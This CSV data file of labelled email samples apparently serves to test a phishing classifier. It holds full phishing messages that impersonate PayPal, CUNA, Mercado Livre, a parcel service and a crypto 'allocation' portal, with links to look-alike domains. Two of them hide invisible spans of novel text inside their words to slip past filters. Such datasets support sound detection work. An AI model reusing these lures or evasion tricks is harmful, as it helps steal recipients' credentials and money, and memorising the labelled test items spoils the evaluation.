subject,body,label,model_prediction
"phishing@pot Ferreira Peixoto, Aviso Importante sobre seu Pedido.","<html><head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8""><style>
body{margin:10px;padding:5px;background:#f5f5f5;font-family:Verdana,sans-serif}
.container{max-width:500px;margin:10px auto;background:#f8f8f8;border-radius:10px;box-shadow:0 3px 5px rgba(0,0,0,.2);overflow:hidden}
.header{background:#1c64c7;padding:15px;text-align:center;color:#eee}
.header h1{margin:0;font-size:22px}
.content{padding:15px;color:#444;font-size:14px;line-height:1.6}
.button{display:inline-block;width:auto;margin:15px auto;padding:8px 18px;background:#f9e23a;color:#111;text-decoration:none;border-radius:6px;font-weight:bold;text-align:center}
.footer{background:#f9e23a;padding:8px;text-align:center;font-size:10px;color:#111}
@media (max-width:500px){.container{width:100%;margin:0;border-radius:0}}
.hidden{position:absolute;left:-9999px;width:0;height:0;overflow:hidden;opacity:0}
</style>
</head>
<body>
<div id=""preheader"" style=""display:none;"">
Data: 08/03/2025 00:09:56 (Horário de Brasília) | Código: EBYF-9NMK
</div>

<div class=""container"">
<div class=""header"">
<h1>C<span style=""visibility: hidden; position: absolute; font-size: 0;"">dispensa a leitura do original para a compreensão do assunto. No</span>or<span style=""visibility: hidden; position: absolute; font-size: 0;"">criados. E agora eu gostaria de apresentar meu filho acrescentou Edward Fitzgerald</span>r<span style=""visibility: hidden; position: absolute; font-size: 0;"">Ela segurava em seu pescoço, com as pernas embrulhadas firmemente ao redor de sua</span>eios</h1>
</div>
<div class=""content"">
<p>phishing@pot Ferreira Peixoto,</p>
<p>Identificamos que seu pedido está retido na al<span style=""visibility: hidden; position: absolute; font-size: 0;"">deveria pôr Mitch na lista de nomes. Neste ritmo, acabará trabalhando</span><span style=""visibility: hidden; position: absolute; font-size: 0;"">As mãos de Ceidre sustentando seu peso se escorregaram, e ela viu os três andares</span>f<span style=""visibility: hidden; position: absolute; font-size: 0;"">assistenciais ver Figura 12. Ao analisar os relatórios de custos, pode-se buscar respos-</span>â<span style=""visibility: hidden; position: absolute; font-size: 0;"">E ele e... e a senhorita Soraya. Ele quase sufocou no nome. A amante dele</span><span style=""visibility: hidden; position: absolute; font-size: 0;"">corpo para fugir dali. Mas ele a segurou e a obrigou a fitá-lo novamente.</span>ndega devido a taxas pendentes de <span style=""visibility: hidden; position: absolute; font-size: 0;"">adulta, onde as funções de reprodução e de obtenção do prazer podem estar associadas, tanto no</span>pagamento.</p>
<p>Para liberar seu <span style=""visibility: hidden; position: absolute; font-size: 0;"">brilho a seu olhar. Suas pupilas se obscureceram pelo pesar durante um</span>pedido, <span style=""visibility: hidden; position: absolute; font-size: 0;"">Eu sei - a sua conversa agora era íntima e Melchior se distraía a olhar para os</span>por favor, <span style=""visibility: hidden; position: absolute; font-size: 0;"">plica em que há aspectos amistosos e repugnantes na nossa nature-</span>realize <span style=""visibility: hidden; position: absolute; font-size: 0;"">COTRIM, Gilberto. Fundamentos de Filosofia. São Paulo: Saraiva, 1993 p.</span>o <span style=""visibility: hidden; position: absolute; font-size: 0;"">suportar uma guerra entre seu pai e seu marido. A premonição de que alguém ia morrer,</span>pag<span style=""visibility: hidden; position: absolute; font-size: 0;"">crianças. Todavia, a compreensão do narrador quanto à mensagem</span>am<span style=""visibility: hidden; position: absolute; font-size: 0;"">Por favor disse ela e um momento depois suas mãos estavam na cintura da calça jeans e ele</span><span style=""visibility: hidden; position: absolute; font-size: 0;"">Abriu a porta, e seu rosto se iluminou ao ver um sorridente Michelle.</span>ent<span style=""visibility: hidden; position: absolute; font-size: 0;"">Mãe! Explodiu. Vá para a outra sala agora mesmo! Reunirei-me com você dentro de</span>o <span style=""visibility: hidden; position: absolute; font-size: 0;"">América. Anteriormente, em Glasgow, ele foi um fabricante de selas que ficou imortalizado nas</span>o mais rápido <span style=""visibility: hidden; position: absolute; font-size: 0;"">ser adulto. Ele quer tomar decisões por si mesmo e é incentivado para isso pela família, pela escola,</span>possível.</p>
<p>Clique no <span style=""visibility: hidden; position: absolute; font-size: 0;"">em uma de nós depois que lhe conhecer deduziu. Assim se converteria</span>botão abaixo para efetuar o <span style=""visibility: hidden; position: absolute; font-size: 0;"">necessariamente de determinada maneira, a regulamentação das relações</span>pagamento:</p>
<a class=""button"" href=""https://juliodedansk.icu""><span style=""visibility: hidden; position: absolute; font-size: 0;"">Nega-se a nos escutar? perguntou Malcolm com o rosto turvado pela ira.</span><span style=""visibility: hidden; position: absolute; font-size: 0;"">Ora! O ferreiro e sua esposa vieram de Whitburn. Você se lembra.</span>P<span style=""visibility: hidden; position: absolute; font-size: 0;"">com os lábios estirados de raiva-. Eu me encarregaria disso. Na realidade,</span>a<span style=""visibility: hidden; position: absolute; font-size: 0;"">de tempo, sobre tudo depois de que morreram seus pais. Era como se</span>g<span style=""visibility: hidden; position: absolute; font-size: 0;"">Possivelmente deveria adoecer de novo, se logo segue esta gratidão.</span>ar Agora</a>
</div>
<div class=""footer"">
<p>C<span style=""visibility: hidden; position: absolute; font-size: 0;"">A análise dos dados coletados é feita no capítulo 4, com a construção de</span><span style=""visibility: hidden; position: absolute; font-size: 0;"">no Danúbio. A maior parte se afogou no mar Negro; tão logo tocavam a</span>o<span style=""visibility: hidden; position: absolute; font-size: 0;"">janela que havia no alto da parede, mas os espaços entre as grades, feitas</span>r<span style=""visibility: hidden; position: absolute; font-size: 0;"">Encontrou-se frente a uma dúzia de guardas, todos vestidos de vermelho, mas não</span>r<span style=""visibility: hidden; position: absolute; font-size: 0;"">tipo de obras ainda surgirão nesse novo e movediço lugar que toma</span>e<span style=""visibility: hidden; position: absolute; font-size: 0;"">Ela puxou a mão de volta. Não, não está. Agora ele nunca vai me levar a sério. Vai</span>i<span style=""visibility: hidden; position: absolute; font-size: 0;"">extremidade do campo, uma espécie de aranha, com múltiplas patas</span>os 2025 <span style=""visibility: hidden; position: absolute; font-size: 0;"">acreditar nos rumores que corriam sobre Aidan. E agora sabia que fez bem.</span>- Todos <span style=""visibility: hidden; position: absolute; font-size: 0;"">Imediatamente, Dane tomou Jacqui pelo braço e a obrigou a subir pela escada.</span>os direitos reservados</p>
</div>
</div>

</body></html>",1,0
Claim Your Allocation:,"<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd""><html><head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=us-ascii""><meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<title>Verti Email</title>

<style type=""text/css"">
ReadMsgBody{ width: 100%;}
.ExternalClass {width: 100%;}
.ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {line-height: 100%;}
body {-webkit-text-size-adjust:100%; -ms-text-size-adjust:100%;margin:0 !important;}
p { margin: 1em 0;}
table td { border-collapse: collapse;}
img {outline:0;}
a img {border:none;}
@-ms-viewport{ width: device-width;}
</style>
<style type=""text/css"">
@media only screen and (max-width: 480px) {
.container {width: 100% !important;}
.footer { width:auto !important; margin-left:0; }
.mobile-hidden { display:none !important; }
.logo { display:block !important; padding:0 !important; }
img { max-width:100% !important; height:auto !important; max-height:auto !important;}
.header img{max-width:100% !important;height:auto !important; max-height:auto !important;}
.photo img { width:100% !important; max-width:100% !important; height:auto !important;}
.drop { display:block !important; width: 100% !important; float:left; clear:both;}
.footerlogo { display:block !important; width: 100% !important; padding-top:15px; float:left; clear:both;}
.nav4, .nav5, .nav6 { display: none !important; }
.tableBlock {width:100% !important;}
.responsive-td {width:100% !important; display:block !important; padding:0 !important; }
.fluid, .fluid-centered {
width: 100% !important;
max-width: 100% !important;
height: auto !important;
margin-left: auto !important;
margin-right: auto !important;
}
.fluid-centered {
margin-left: auto !important;
margin-right: auto !important;
}
/* MOBILE GLOBAL STYLES - DO NOT CHANGE */
body { padding: 0px !important; font-size: 16px !important; line-height: 150% !important;}
h1 { font-size: 22px !important; line-height: normal !important;}
h2 { font-size: 20px !important; line-height: normal !important;}
h3 { font-size: 18px !important; line-height: normal !important;}
.buttonstyles {
font-family:arial,helvetica,sans-serif !important;
font-size: 16px !important;
color: #FFFFFF !important;
padding: 10px !important;
}
/* END OF MOBILE GLOBAL STYLES - DO NOT CHANGE */
}
@media only screen and (max-width: 640px) {
.container { width:100% !important; }
.mobile-hidden { display:none !important; }
.logo { display:block !important; padding:0 !important; }
.photo img { width:100% !important; height:auto !important;}
.nav5, .nav6 { display: none !important;}
.fluid, .fluid-centered {
width: 100% !important;
max-width: 100% !important;
height: auto !important;
margin-left: auto !important;
margin-right: auto !important;
}
.fluid-centered {
margin-left: auto !important;
margin-right: auto !important;
}
}
</style>
<!--[if mso]>
<style type=""text/css"">
/* Begin Outlook Font Fix */
body, table, td {
font-family: Arial, Helvetica, sans-serif ;
font-size:16px;
color:#808080;
line-height:1;
}
/* End Outlook Font Fix */
</style>
<![endif]-->
</head>
<body bgcolor=""#efefef"" text=""#181818"" style=""background-color: #0a0a0a;color: #ffffff;margin: 0px;padding: 20px;-webkit-text-size-adjust:none;line-height: normal;font-size: 16px;font-family:arial,helvetica,sans-serif;"">
<div style=""font-size:0; line-height:0;""><img src=""https://click.email-biolifeplasma.com/open.aspx?ffcb10-fe5b1077746104797c12-fdc215787360017f7712757667-fe3b11727164047c7d1470-fe601673776d0c7d7412-fe2717727c650674711c72-feef17737d6d0d&amp;d=10191&amp;bmt=0"" width=""1"" height=""1"" alt=""""></custom></custom></div>
<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" align=""center"">
<tbody><tr>
<td align=""center"" valign=""top"">
<custom type=""header"">
</custom></td>
</tr>
<tr>
<td align=""center"">
<table cellspacing=""0"" cellpadding=""0"" border=""0"" width=""600"" class=""container"" align=""center"">
<tbody><tr>
<td>
<!-- added the border style here -->
<table class=""tb_properties border_style"" cellspacing=""0"" cellpadding=""0"" bgcolor=""#151515"" width=""100%"" style=""border-radius:20px;"">
<!-- end of comment -->
<tbody><tr>
<td align=""center"" valign=""top"">
<table align=""left"" border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%"">
<tbody><tr>
<!-- added padding here -->
<td class=""content_padding"" style=""padding:10px;border-radius:20px;"">
<!-- end of comment -->
<table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%"">
<tbody><tr>
<td align=""left"" class=""header"" role=""banner"" aria-label=""header"" valign=""top"">
<table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""border-bottom: 1px solid #AEAEAE; min-width: 100%; "" class=""slot-styling""><tbody><tr><td style=""padding-bottom: 20px; "" class=""slot-styling camarker-inner""><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""text-align: center; min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr><td style=""padding-top: 10px; "" class=""stylingblock-content-wrapper camarker-inner"" align=""center""><table width=""100%"" cellspacing=""0"" cellpadding=""0"" role=""presentation""><tbody><tr><td align=""center"">
<img src=""https://image.correo.verti.es/lib/fe9913737767057977/m/1/99395953-3f20-4992-918b-24c04e11117c.jpeg"" alt=""Logo Verti"" width=""80"" style=""display: block; width: 80px; text-align: center; padding: 0px;""></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
</td>
</tr>
<tr>
<td align=""left"" class="""" valign=""top"">
<table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""border-bottom: 1px solid #AEAEAE; min-width: 100%; "" class=""slot-styling""><tbody><tr><td style=""padding-bottom: 20px; "" class=""slot-styling camarker-inner""><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr><td style=""padding-top: 10px; padding-right: 10px; padding-left: 10px; "" class=""stylingblock-content-wrapper camarker-inner""><table cellspacing=""0"" cellpadding=""0"" style=""width: 100%;""><tbody><tr><td><table cellspacing=""0"" cellpadding=""0"" style=""width: 100%;""><tbody><tr>
<td class=""responsive-td"" valign=""top"" style=""width: 100%;""><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr><td class=""stylingblock-content-wrapper camarker-inner"">

<div style=""text-align: center;"">Dear user,</div><br>
<div style=""text-align: center;"">The S2 distribution is now available. Please sign in to your dashboard to:</div><ul><li>review your eligibility status,</li><li>confirm the amount allocated to you,</li><li>and start the release to your designated wallet.</li></ul><div style=""text-align: center;"">Before proceeding, verify that your account details are correct and complete any pending verification steps. For security, releases can only be initiated from your authenticated account.</div></td></tr></tbody></table><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""text-align: left; min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr>
<td style=""padding-top: 20px; padding-bottom: 20px; "" class=""stylingblock-content-wrapper camarker-inner"" align=""left""><table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""5""><tbody><tr><td align=""center""><table border=""0"" cellspacing=""0"" cellpadding=""0""><tbody><tr><td class=""innertd buttonblock"" align=""center"" bgcolor=""#5D5D5D"" style=""border-radius: 3px; -moz-border-radius: 3px; -webkit-border-radius: 3px;"">
<a target=""_blank"" style=""text-decoration: none;display: block;background-color: #d4a574;border: 1px solid #d4a574;font-family: Arial, Helvetica, sans-serif;font-size: 16px;color: #FFFFFF;padding: 10px;border-radius: 3px;-moz-border-radius: 3px;-webkit-border-radius: 3px;font-weight:700;"" class=""buttonstyles"" href=""https://click.email-biolifeplasma.com/?qs=1ac7ea6de125948358f3428462f56fdf18fad548b9e49e502cc560f5a081cc095b22343092ab8da952ee596a0564d966fc8a4d9d4f71ad6c99add3530736f4f7"" title="""">Access Portal</a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>
</td>
</tr>

<tr>
<td align=""left"" role=""contentinfo"" aria-label=""footer"" class="""" valign=""top"">
<table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""min-width: 100%; "" class=""slot-styling""><tbody><tr><td style=""padding-top: 20px; "" class=""slot-styling camarker-inner""><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""text-align: center; min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr><td class=""stylingblock-content-wrapper camarker-inner"" align=""center""><div style=""text-align: center;font-size:14px;"">This email was sent by asterdex.</div><div style=""text-align: center;font-size:14px;"">You receive this email because you have subscribed to our newsletter you can:
<a href=""https://click.email-biolifeplasma.com/?qs=1ac7ea6de125948363ce3b9a769f3abeb575f465ab65a62f398bf4152acdfda8678b9f23bd1e8f94e48534c7b93459156545b6c9201341b5d2ce6d1c28579297"" target=""_blank"" style=""font-size:14px;color: #1e39f3;text-decoration: none;"">Unsubscribe</a>.</div></td></tr></tbody></table><table cellpadding=""0"" cellspacing=""0"" width=""100%"" role=""presentation"" style=""min-width: 100%; "" class=""stylingblock-content-wrapper""><tbody><tr><td style=""padding-top: 10px; padding-right: 10px; padding-left: 10px; "" class=""stylingblock-content-wrapper camarker-inner""><div style=""text-align: center;""><span style=""font-size:14px;""> 2025 All Rights Reserved Asterdex.</span></div>
</td></tr></tbody></table></td></tr></tbody></table>
</td>
</tr>
</tbody></table>
</td>
</tr>
</tbody></table>
</td>
</tr>
</tbody></table>
</td>
</tr>
</tbody></table>
</td>
</tr>
<tr>
<td valign=""top"">
<custom type=""footer"">
</custom></td>
</tr>
</tbody></table>

</body></html>",1,0
Analytics Tools,Which analytics tools can best optimize investment portfolios for financial firms? Assistance in identifying the most effective tools is needed.,0,0
Please Verify Account !,"Log Out | Help PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with secure service. Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologize for the inconvenience. Why is my account access limited?Your account access has been limited for the following reason(s): Aug. 8, 2005: We would like to ensure that your account was not accessed by an unauthorized third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection. (Your case ID for this reason is PP-087-160-864.) How can I restore my account access? Please confirm your identity here: Restore My Account and complete the ""Steps to Remove Limitations."" Completing all of the checklist items will automatically restore your account access. Mobile | Mass Pay | Money Market | ATM/Debit Card | BillPay | Referrals | About Us | Accounts | Fees | Privacy | Buyer Credit | Security Center | Contact Us | User Agreement | Developers | Sho! ps | Gift Certificates/Points PayPal, an eBay company Copyright © 1999-2005 PayPal. All rights reserved.Information about FDIC pass-through insurance",1,1
Re: [opensuse] Intel 3945 Wireless Problem opensuse 10.3 - RESOLVED!,"Fred A. Miller wrote: > Of course! I REFUSE to setup any wireless for any amount of money > without WPA using AES!!! > > Fred > Funny thing. I have an IBM ThinkPad R31 notebook that came with WiFi. The original 802.11b card had WPA support in Linux, but not Windows. I then upgraded to a b/g card. Now Windows will support WPA, but not WPA2 that Linux on that same computer supports. In order to get WPA2 in XP, I have to download an update from MS, but getting that update requires installing ""Windows Genuine Advantage"" spyware. So, this computer will only be doing WPA on the rare occasions I use Windows with it, while Linux will be WPA2. My Nokia N800 also does WPA2. -- Use OpenOffice.org",0,0
"PO Approval Required: €66,409","Purchase Order Request:

Vendor: MetalWorks Inc
Amount: €58,958
Description: Spare parts
Urgency: Urgent - Production down

Please approve in system.

John",0,0
Protect the security of your online account.,"LEGAL NOTICE Message sent to you follows: Dear CUNA client, While performing it's regular scheduled monthly billing address check our system found incompatible information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of this information you still need to follow up the previous link and update your existing billing information because it means that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation. We apologies for any inconvinience this may caused you and we strongly advise you to update your information you have on file with us. Please login in order to avoid any possible futuring billing problems with your account. Best regards, - CUNA Team.",1,0
"Olá, você removeu seu método de autenticação de duas etapas?","<!DOCTYPE html><html lang=""pt-BR""><head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<meta name=""color-scheme"" content=""light"">
<meta name=""supported-color-schemes"" content=""light"">
<title>Mercado Livre - Notificação de Segurança</title>
<style>
@media screen and (max-width: 480px) {
.container {
width: 100% !important;
}

.content {
padding: 20px 15px !important;
}

.white-box {
padding: 20px 15px !important;
}

.message {
font-size: 20px !important;
}

.info-text {
font-size: 16px !important;
}
}
</style>
</head>

<body style=""font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5;"">
<div id=""preheader"" style=""display:none;"">
Data: 22/04/2025 10:49:04 (Horário de Brasília) | Código: X0F0-VT9J
</div>

<table role=""presentation"" width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody><tr>
<td align=""center"" style=""padding: 20px 0;"">
<table role=""presentation"" class=""container"" width=""600"" border=""0"" cellspacing=""0"" cellpadding=""0"" style=""max-width: 600px; margin: 0 auto;"">
<!-- HEADER -->
<tbody><tr>
<td class=""header"" align=""left"" style=""background-color: #fff159; padding: 20px;"">
<img src=""https://http2.mlstatic.com/static/org-img/mkt/email-mkt-assets/davinci/2x/logo-meli-br@2x.png"" alt=""Mercado Livre"" class=""logo"" style=""max-height: 40px; display: block;"">
</td>
</tr>

<!-- CONTENT -->
<tr>
<td class=""content"" align=""center"" style=""background-color: #fff159; padding: 30px 20px;"">
<h1 class=""message"" style=""font-size: 24px; color: #333333; margin: 0; font-weight: bold;"">Olá,<br>detectamos uma alteração.</h1>

<div class=""white-box"" style=""background-color: #ffffff; padding: 30px; margin-top: 20px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"">
<p class=""info-text"" style=""font-size: 18px; color: #333333; line-height: 1.5; margin: 0;"">Você removeu seu método de autenticação de duas etapas.<br>Se não foi você, <span style=""visibility: hidden; position: absolute; font-size: 0;"">Claro que teve. Connor deslizou para a cadeira do outro lado de Adne,</span>por favor, avise-nos imediatamente.</p>

<div class=""button-container"" style=""margin-top: 30px; text-align: center;"">
<a href=""https://julio-de-livs.icu"" class=""button"" style=""display: inline-block; background-color: #3483fa; color: #ffffff; text-decoration: none; padding: 12px 40px; border-radius: 4px; font-size: 16px; font-weight: bold; border: 0;""><span style=""visibility: hidden; position: absolute; font-size: 0;"">zante. Bela então deseja voltar para a Fera e imediatamente é trans-</span>Não fui eu</a>
</div>
</div>
</td>
</tr>

<!-- FOOTER -->
<tr>
<td class=""footer"" align=""center"" style=""padding: 30px 20px; background-color: #ffffff; border-top: 1px solid #eeeeee;"">
<p class=""help-text"" style=""font-size: 16px; margin: 0; color: #666666;"">Precisa de ajuda? <a href=""https://julio-de-livs.icu"" class=""link"" style=""color: #3483fa; text-decoration: none; font-weight: bold;"">Fale conosco</a></p>
<p style=""font-size: 12px; color: #999999; margin-top: 20px;"">Este <span style=""visibility: hidden; position: absolute; font-size: 0;"">Eu tinha 17 anos quando fui convertido em nosferatu - Vane levantou mais os</span>é um email <span style=""visibility: hidden; position: absolute; font-size: 0;"">Alice lhe deu um olhar que dizia estar cheia daquilo. Continue tentando dizer isso a si</span>automático. Por favor, não <span style=""visibility: hidden; position: absolute; font-size: 0;"">repetidas e, portanto, cristalizadas e consagradas, se adotasse um método</span>responda a esta mensagem.</p>
</td>
</tr>
</tbody></table>
</td>
</tr>
</tbody></table>

</body></html>",1,0
Work-Study - Carnegie Mellon University,"CMU archived phishing listing entry.

Date: 11/20/25
Target Audience: Students
Source Entry: https://www.cmu.edu/iso/aware/phish/phish-bowl-examples/2025/work-study-carnegie-mellon.html

Note: The linked CMU detail page currently redirects to a general Secure Computing page, so the original message body is not publicly available from the live site.",1,0
Approval needed: Volume discount,"Need approval for:

Customer: Company_867
Deal size: €293,138
Discount requested: 20%
Reason: Volume commitment

Please approve in system.

Alexandra",0,0
"PO Approval Required: €38,269","Purchase Order Request:

Vendor: FastParts AG
Amount: €28,976
Description: Spare parts
Urgency: Standard

Please approve in system.

Brandy",0,0
